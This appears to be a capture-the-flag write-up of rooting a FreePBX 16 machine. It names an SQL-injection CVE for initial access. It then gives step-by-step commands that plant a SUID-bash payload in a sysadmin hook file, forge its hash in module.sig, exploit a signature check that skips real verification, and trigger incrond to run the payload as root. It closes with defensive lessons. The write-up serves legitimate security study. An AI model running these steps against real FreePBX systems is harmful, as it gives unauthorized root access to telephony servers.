Machine Overview

Connected runs FreePBX 16.0.40.7 on Sangoma Linux 7. Initial access uses CVE-2025-57819 — an unauthenticated SQL injection in the FreePBX recordings endpoint chained into RCE, yielding a Meterpreter shell as asterisk. Privilege escalation chains three weaknesses: the asterisk user can write to module hook files and module.sig; the IonCube-encoded checkSig() parses signed content without actually verifying the GPG signature; and incrond (running as root) fires sysadmin_manager on directory writes — allowing arbitrary root code execution via a tampered hash in module.sig.

Post-Exploitation — incrond & sysadmin_manager

05
incrond System Tables & Hook Runner
Enumeration · Phase 05

incrond is an inotify-based cron daemon running as root. Its system tables in /etc/incron.d/ define directory and file watches. Two tables are relevant: sysadmin watches DIRECTORIES (working in incron 0.5.10), and legacy watches specific FILES (silently broken in incron 0.5.10 due to a known bug).

bash — /etc/incron.d/sysadmin (WORKING)
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
bash — /etc/incron.d/legacy (BROKEN — file-specific watches)
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
# ^ File-specific watches silently don't fire in incron 0.5.10
⚠
incron 0.5.10 Bug: File-specific inotify watches in the legacy table silently do not fire. Only directory watches (the sysadmin table) reliably trigger. Any file written to /var/spool/asterisk/incron/ fires sysadmin_manager <filename> as root.
06
sysadmin_manager Logic & Verification Chain
Enumeration · Phase 06

sysadmin_manager is the privileged hook runner. It derives the module name and hook name from the trigger filename (format: modulename_hookname), then performs a verification chain before executing the hook file as root.

php — sysadmin_manager verification logic (pseudocode)
// Trigger: filename "sysadmin_reboot"
$module = "sysadmin";
$hook   = "reboot";

// File paths derived from module name
$sigfile  = "/var/www/html/admin/modules/sysadmin/module.sig";
$hookfile = "/var/www/html/admin/modules/sysadmin/hooks/reboot";

// Step 1: GPG-verify module.sig (calls checkSig())
$verify = $g->checkSig($sigfile);

// Step 2: Validate signing key against whitelist
if (!isset($whitelist[$verify['config']['signedwith']])) { exit; }

// Step 3: SHA256 hash check — hook vs value in module.sig
if (hash_file('sha256', $hookfile) !== $verify['hashes']['hooks/'.$hook]) { exit; }

// Step 4: Execute hook as root
system("$hookfile $params");
✕
The Vulnerability: checkSig() in the IonCube-encoded includes.php parses the module.sig content (extracting the [hashes] section) without actually verifying the PGP signature. The GPG signature block is read but not cryptographically validated — allowing the hash values to be freely tampered with.
07
module.sig & Hook Files Are Writable by asterisk
Enumeration · Phase 07

FreePBX ships with the sysadmin module's hook files and module.sig writable by the asterisk user — likely an oversight from the developer comment // Todo: Writable checks found in the firewall module source.

bash — permission check
find /var/www/html/admin/modules/ -path '*/hooks/*' -writable
# Returns ALL hook files — writable by asterisk

ls -la /var/www/html/admin/modules/sysadmin/module.sig
-rw-rw-r--. 1 asterisk asterisk  ← writable by asterisk group

ls -la /var/spool/asterisk/incron/
drwxrwxr-x.  2 asterisk asterisk  ← incron trigger dir writable
✓
Full Control Over Verification Inputs: The asterisk user can write the hook file, write the hash into module.sig, and write the trigger file to /var/spool/asterisk/incron/. Combined with the GPG bypass, this constitutes complete control over the root execution path.

PrivEsc — Hash Tamper + incrond → SUID Root Shell

08
Write Malicious Hook File
PrivEsc · Phase 08

Overwrite the hooks/reboot file with a payload that creates a SUID copy of bash. The payload runs as root when sysadmin_manager executes it via incrond.

bash
cat > /var/www/html/admin/modules/sysadmin/hooks/reboot << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
EOF
chmod +x /var/www/html/admin/modules/sysadmin/hooks/reboot
09
Compute New SHA256 & Patch module.sig
PrivEsc · Phase 09

Compute the SHA256 of the malicious hook, then replace the original hash entry in module.sig. Since checkSig() does not verify the GPG signature, the tampered content is accepted — only the hash comparison matters, and we control both sides.

bash — compute new hash
sha256sum /var/www/html/admin/modules/sysadmin/hooks/reboot
db230c576afae57c4a4bcde5c08e7b686c604fef26032f2bc0d75f21a2c4cc78  hooks/reboot
bash — patch module.sig
sed -i \
  's|hooks/reboot = 905fde49ef92f8e7fd72c76e226bf8a1c8f09610d68a475c720a51a62afd4339|hooks/reboot = db230c576afae57c4a4bcde5c08e7b686c604fef26032f2bc0d75f21a2c4cc78|' \
  /var/www/html/admin/modules/sysadmin/module.sig
◈
GPG Bypass Explained: module.sig is a PGP clearsigned message. The signature block remains in the file — but checkSig() never calls gpg --verify. It only parses the [hashes] section via regex/string parsing. The invalid signature is silently ignored.
10
Trigger incrond & Capture Root Shell
PrivEsc · Phase 10

Write a file named sysadmin_reboot to the incron-watched directory. incrond fires sysadmin_manager sysadmin_reboot as root. The script decodes module=sysadmin, hook=reboot, passes the hash check against the patched module.sig, and executes the malicious hook as root.

bash — trigger incrond
python3 -c "
open('/var/spool/asterisk/incron/sysadmin_reboot','w').write('trigger')
"
# incrond fires: /usr/bin/sysadmin_manager sysadmin_reboot (as root)
# sysadmin_manager: module=sysadmin hook=reboot → hash OK → executes hooks/reboot as root
bash — verify SUID rootbash + read root flag
ls -la /tmp/rootbash
-rwsr-xr-x 1 root root 964536 /tmp/rootbash   ← SUID bit set

/tmp/rootbash -p -c 'id'
uid=1001(asterisk) euid=0(root)

/tmp/rootbash -p -c 'cat /root/root.txt'
✓
Root via SUID bash: The SUID rootbash was created by the malicious hook running as root via incrond. The -p flag preserves the effective UID (euid=0), giving full root privileges.

key takeaways
// 01
incron 0.5.10: File Watches Are Silently Broken
incron 0.5.10 has a known bug where inotify watches on specific files silently fail to fire. Only directory watches work reliably. The legacy table's file-specific entries were all dead ends — recognising this immediately directed attention to the sysadmin table's directory watch as the only live root trigger path.
// 02
IonCube Encoding Is Not a Security Boundary
The GPG verification logic in includes.php was IonCube-encoded — giving a false impression of protected code. Runtime behaviour testing revealed that checkSig() parses signed content without cryptographically verifying it. Obfuscation is not a substitute for correct implementation.
// 03
Signature Verification Must Actually Verify
A GPG signature check that only parses the signed content block without calling gpg --verify provides zero integrity guarantees. The entire trust chain — whitelist check, hash comparison, hook execution — collapses if the signature block is parsed but never cryptographically validated.
// 04
Application Files in Root Execution Paths Must Be Root-Owned
FreePBX shipping module.sig and hooks/ with asterisk group write permissions while a root-privileged hook runner reads them is an unconditional privilege escalation path. Any file read by a root-privileged process must be owned exclusively by root with no write access for unprivileged accounts.
// 05
Service Accounts Must Follow Least Privilege
The asterisk service account having write access to module hook files — files that are subsequently executed as root — represents a complete privilege escalation primitive. Service accounts must be restricted to the minimum filesystem permissions required for their function, audited against all privileged execution paths.
// 06
Developer TODOs Are Attack Surface Indicators
A // Todo: Writable checks comment in the firewall module source confirms the FreePBX developers were aware of the permission gap but never addressed it. Security-relevant TODOs must be treated as open vulnerabilities and tracked in a security backlog rather than left in production code indefinitely.
